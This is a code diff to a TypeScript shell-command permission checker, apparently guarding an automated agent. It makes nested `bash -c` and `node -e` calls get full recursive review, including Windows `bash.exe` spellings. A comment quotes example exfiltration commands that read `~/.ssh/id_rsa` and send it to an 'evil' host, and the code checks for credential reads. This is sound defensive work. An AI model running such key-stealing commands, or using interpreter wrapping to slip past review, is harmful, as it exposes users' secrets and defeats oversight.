@@ -67,6 +67,25 @@ function allowed(
   }
 }
 
+/**
+ * Reshape an inner assessment for the outer call while carrying its facts.
+ *
+ * Crossing an interpreter boundary is not a reason to discard the literal
+ * pre-execution facts the inner analysis established. Dropping them means the
+ * artifact registry never learns about a wrapped creation — so a later delete
+ * of that same path is judged out-of-session and reviewed — and the classifier
+ * loses exactly the pre-existence evidence it exists to receive.
+ */
+function adopt(inner: Assessment, decision: 'ask' | 'deny', reason: string): Assessment {
+  return {
+    decision,
+    reason,
+    classifierEligible: decision === 'ask',
+    ...(inner.plannedCreates === undefined ? {} : { plannedCreates: inner.plannedCreates }),
+    ...(inner.filesystemEffects === undefined ? {} : { filesystemEffects: inner.filesystemEffects }),
+  }
+}
+
 function pathExists(path: string): boolean {
   try {
     lstatSync(path)
@@ -531,6 +550,17 @@ interface NestedExecution {
   readonly source?: string
   /** The source word itself depends on an outer-shell expansion. */
   readonly dynamicSource?: boolean
+  /**
+   * Shell dialect to re-analyze the inline source with, or `undefined` when the
+   * inline source is not a shell command line (an interpreted language).
+   *
+   * Resolved from the same `.exe`-stripped name as the `SCRIPT_EXTENSIONS`
+   * gate. Looking the raw command name up in `NESTED_SHELL_KIND` instead would
+   * be silent for the Windows spelling: `bash.exe` misses the table, `undefined`
+   * already means "not a nested shell", and the shell would be demoted to the
+   * non-shell detectors — skipping the recursive analysis entirely.
+   */
+  readonly shellKind?: ShellKind
 }
 
 const SCRIPT_EXTENSIONS: Readonly<Record<string, RegExp>> = {
@@ -563,10 +593,14 @@ function literalScriptInvocation(name: string, words: readonly CommandWord[]): b
   return file !== undefined && !file.dynamic && !file.glob && !file.text.startsWith('-') && extension.test(file.text)
 }
 
-function inlineSource(word: CommandWord | undefined, source = word?.text): NestedExecution {
+function inlineSource(word: CommandWord | undefined, shellKind?: ShellKind, source = word?.text): NestedExecution {
   return word === undefined || source === undefined
     ? {}
-    : { source, dynamicSource: word.dynamic || word.glob }
+    : {
+        source,
+        dynamicSource: word.dynamic || word.glob,
+        ...(shellKind === undefined ? {} : { shellKind }),
+      }
 }
 
 /** Describe an interpreter boundary and whether its inline source is visible. */
@@ -577,13 +611,15 @@ function nestedExecution(name: string, words: readonly CommandWord[]): NestedExe
     if (interpreter === 'node' && words.length === 2 && words[1]?.text === '--test') return undefined
     if (literalScriptInvocation(interpreter, words) || versionProbe(words)
       || (words.length === 2 && /^(?:--version|--help)$/.test(words[1]?.text ?? ''))) return undefined
-    const shell = ['sh', 'bash', 'zsh', 'fish', 'ksh', 'dash', 'cmd', 'powershell', 'pwsh'].includes(interpreter)
-    const inlineFlag = shell ? /^(?:-c|\/c|--?command)$/i : /^(?:-c|-e|-E|--eval|--exec|--command|--print)$/
+    const shellKind = NESTED_SHELL_KIND[interpreter]
+    const inlineFlag = shellKind !== undefined
+      ? /^(?:-c|\/c|--?command)$/i
+      : /^(?:-c|-e|-E|--eval|--exec|--command|--print)$/
     for (let index = 1; index < words.length; index += 1) {
       const word = words[index] as CommandWord
-      if (inlineFlag.test(word.text)) return inlineSource(words[index + 1])
+      if (inlineFlag.test(word.text)) return inlineSource(words[index + 1], shellKind)
       const attached = /^(--(?:eval|exec|command|print))=(.*)$/.exec(word.text)
-      if (attached !== null && inlineFlag.test(attached[1] as string)) return inlineSource(word, attached[2])
+      if (attached !== null && inlineFlag.test(attached[1] as string)) return inlineSource(word, shellKind, attached[2])
     }
     // Abbreviated, combined, encoded and future options are opaque. Do not
     // guess which following word is code or let them fall through to allow.
@@ -996,19 +1032,22 @@ function assessSegment(
     // `node -e "...readFileSync(id_rsa)...http.get(evil)"` and
     // `bash -c "cat ~/.ssh/id_rsa"` unreviewed while the direct forms were
     // reviewed. Analyze the inline source instead of trusting the wrapper.
-    const nestedShell = NESTED_SHELL_KIND[name]
+    const nestedShell = nested.shellKind
     if (nestedShell !== undefined) {
       if (depth >= MAX_NESTED_SHELL_DEPTH) {
         return semanticReview(`interpreter nesting exceeds the reviewable depth at ${name}`)
       }
       const inner = assessShellInternal(nested.source, nestedShell, roots, artifacts, owner, depth + 1)
       if (inner.decision === 'deny') {
-        return denied(`nested ${name} command is not permitted: ${inner.reason}`)
+        return adopt(inner, 'deny', `nested ${name} command is not permitted: ${inner.reason}`)
       }
       if (inner.decision === 'ask') {
-        return semanticReview(`nested ${name} command requires semantic review: ${inner.reason}`)
+        return adopt(inner, 'ask', `nested ${name} command requires semantic review: ${inner.reason}`)
       }
-      return assessRedirections(allowed(`nested ${name} command is a recognized routine operation`), segment, shell, roots)
+      return assessRedirections(
+        allowed(`nested ${name} command is a recognized routine operation`, inner.plannedCreates, inner.filesystemEffects),
+        segment, shell, roots,
+      )
     }
     if (INLINE_CODE_SENSITIVE_READ.test(nested.source)) {
       return semanticReview(`inline ${name} code reads credential, environment, or sensitive path data; reads are not sandbox-confined`)
